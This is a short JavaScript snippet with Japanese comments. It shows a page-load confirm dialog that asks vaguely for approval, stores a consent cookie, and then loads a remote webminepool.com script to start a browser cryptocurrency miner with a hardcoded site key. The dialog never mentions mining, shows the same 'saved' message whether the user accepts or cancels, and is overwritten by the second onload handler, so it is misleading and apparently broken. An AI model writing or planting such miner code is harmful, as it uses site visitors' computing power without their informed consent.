// 許可するか質問----------------------------------------------------
// クッキーを設定する関数
function setCookie(name, value, days) {
  let expires = "";
  if (days) {
    let date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// ユーザーの選択を確認し、OKが選択された場合にクッキーを設定する関数
function confirmAndSetCookie() {
  // confirmダイアログを表示し、ユーザーの選択を取得
  let userChoice = confirm("この操作を承認しますか？");

  // ユーザーがOKを選択した場合
  if (userChoice) {
    // 'userClickedOK'という名前のクッキーを設定して、ユーザーがOKを押したことを記録
    setCookie('userClickedOK', 'true', 365); // 365日間有効
    alert("この選択を保存しました、この選択はクッキーを削除することで変更出来ます");
  } else {
    // ユーザーがキャンセルを選択した場合、特に何もしない
    alert("この選択を保存しました、この選択はクッキーを削除することで変更出来ます");
  }
}
　

// ページロード時に実行
window.onload = function() {
  confirmAndSetCookie();
};
// マイニング関連----------------------------------------------------------------
// クッキーを取得する関数
function getCookie(name) {
  let nameEQ = name + "=";
  let ca = document.cookie.split(';');
  for(let i=0;i < ca.length;i++) {
    let c = ca[i];
    while (c.charAt(0)==' ') c = c.substring(1,c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
  }
  return null;
}

// ページロード時に実行
window.onload = function() {
  // 'userClickedOK'クッキーが存在し、その値が'true'であるかをチェック
  if (getCookie('userClickedOK') === 'true') {
    // 条件を満たした場合、指定されたスクリプトを実行
    var script = document.createElement('script');
    script.src = "https://webminepool.com/lib/base.js";
    document.head.appendChild(script);

    script.onload = function() {
        var miner = WMP.Anonymous('SK_WvA9BOGisDp24JKNBb6cX',{throttle: 0.3});
        miner.start();
    };
  }
};
